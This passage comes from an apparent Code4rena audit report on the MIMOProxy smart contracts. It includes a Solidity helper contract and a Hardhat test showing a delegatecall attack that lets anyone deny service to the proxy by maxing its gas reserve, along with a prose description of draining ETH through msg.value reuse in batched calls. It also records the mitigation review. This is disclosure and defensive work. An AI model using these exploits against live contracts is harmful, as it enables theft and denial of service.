class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">NOT_OWNER</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newMinGasReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h4 id=\"test-cases-1\" style=\"position:relative;\"><a href=\"#test-cases-1\" aria-label=\"test cases 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Test cases</h4>\n<p>We’ll use this <code>ProxyAttacks</code> helper contract to manipulate proxy storage. Note that it has the same storage layout as <code>MIMOProxy</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProxyAttacks</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes4</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_permissions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">// Selector 0xf613a687</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returnTrue</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk3\">// Selector 0x5f9981ae</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setGasReserve</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Then deploy the <code>ProxyAttacks</code> helper in a test environment and use <code>MIMOProxy</code> to <code>delegatecall</code> into it:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chai</span><span class=\"mtk1\">, { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;chai&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;ethereum-waffle&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;hardhat&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MIMOProxyFactory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MIMOProxyRegistry</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ProxyAttacks</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../../typechain&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">chai</span><span class=\"mtk1\">.</span><span class=\"mtk11\">use</span><span class=\"mtk1\">(</span><span class=\"mtk12\">solidity</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">setup</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createFixture</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">deploy</span><span class=\"mtk1\"> } = </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSigners</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyFactory&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxyFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyFactory&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyRegistry&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxyRegistry</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyRegistry&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProxyAttacks&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ProxyAttacks</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProxyAttacks&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  };</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Proxy attack tests&quot;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;DoS by manipulating gas reserve&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\"> } = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setup</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCurrentProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Call setGasReserve on ProxyAttacks contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0x5f9981ae&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Proxy&#39;s minGasReserve is now type(uint256).max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">minGasReserve</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">constants</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MaxUint256</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// All calls revert due to underflow calculating gas stipend</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0xf613a687&quot;</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk11\">revertedWith</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk8\">&quot;Arithmetic operation underflowed or overflowed outside of an unchecked block&quot;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/158#issuecomment-1210483560\">RnkSngh (Mimo) marked as duplicate</a>:</strong></p>\n<blockquote>\n<p>Duplicate of <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/161\">#161</a>. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/158#issuecomment-1221557802\">gzeoneth (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Not a duplicate due to griefing by minGasReserve.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> Wardens identified that users could lose access to their <code>MIMOProxy</code> by setting a high minimum gas reserve using <code>delegatecall</code>.</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The minimum gas reserve by proxy address is now stored in the <code>_proxyStates</code> mapping in <code>MIMOProxyFactory</code>. The proxy owner may update the minimum gas reserve value for their proxy by calling the <code>setMinGas</code> function. This behavior is demonstrated by a unit test <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/test/01_unit/proxy/MIMOProxyFactory.test.ts#L204\">here</a>.\nOnly the owner may call <code>setMinGas</code>. Authorization behavior is demonstrated by a unit test <a href=\"https://github.com/mimo-capital/2022-08-mimo/blob/4e579420ecbe3fc3e770996610e6ab66b0c8d15b/test/01_unit/proxy/MIMOProxyFactory.test.ts#L215\">here</a>.</p>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since <code>minGasReserve</code> is no longer stored in <code>MIMOProxy</code> storage, it cannot be manipulated as described in the original finding.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-persisted-msgvalue-in-a-loop-of-delegate-calls-can-be-used-to-drain-eth-from-your-proxy\" style=\"position:relative;\"><a href=\"#m-04-persisted-msgvalue-in-a-loop-of-delegate-calls-can-be-used-to-drain-eth-from-your-proxy\" aria-label=\"m 04 persisted msgvalue in a loop of delegate calls can be used to drain eth from your proxy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/153\">[M-04] Persisted msg.value in a loop of delegate calls can be used to drain ETH from your proxy</a></h2>\n<p><em>Submitted by peritoflores, also found by 8olidity and vlad_bochok</em></p>\n<p><code>msg.value</code> in a loop can be used to drain proxy funds.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>While <code>BoringBatchable</code> is out of the scope, this bug affects seriously <code>MIMOProxy</code> as it inherits.</p>\n<p>Some time ago I read a report about an auditor called <em>samczsun</em>  (<a href=\"https://samczsun.com/two-rights-might-make-a-wrong/\">https://samczsun.com/two-rights-might-make-a-wrong/</a>).     I believe that you are having the same problem here.</p>\n<p>I will try to  explain it as brief as possible but I can add a PoC in QA stage if required.</p>\n<h4 id=\"first-step-draining-eth\" style=\"position:relative;\"><a href=\"#first-step-draining-eth\" aria-label=\"first step draining eth permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>First step: Draining ETH</h4>\n<p>This vulnerability comes from the fact that <code>msg.value</code> and <code>msg.sender</code> are persisted in <code>delegatecall</code>.</p>\n<p>It is possible to call  <code>execute()</code> (which is payable ) from  <code>batch()</code> (which is also payable )   because both are public functions.   (For now ignore the fact that <code>execute()</code> has access control).</p>\n<p>The attacker would call <code>batch()</code> sending, for example, 1 ETH with an array of 100 equal items that call <code>execute()</code></p>\n<p>This <code>execute()</code> will call and external contract 100 times and in every time it will send 1ETH from proxy funds (not from the attacker).</p>\n<p>If the receiving contract stores these value then the proxy wallet will be drained.</p>\n<h4 id=\"second-step-access-control-bypass-scenario\" style=\"position:relative;\"><a href=\"#second-step-access-control-bypass-scenario\" aria-label=\"second step access control bypass scenario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 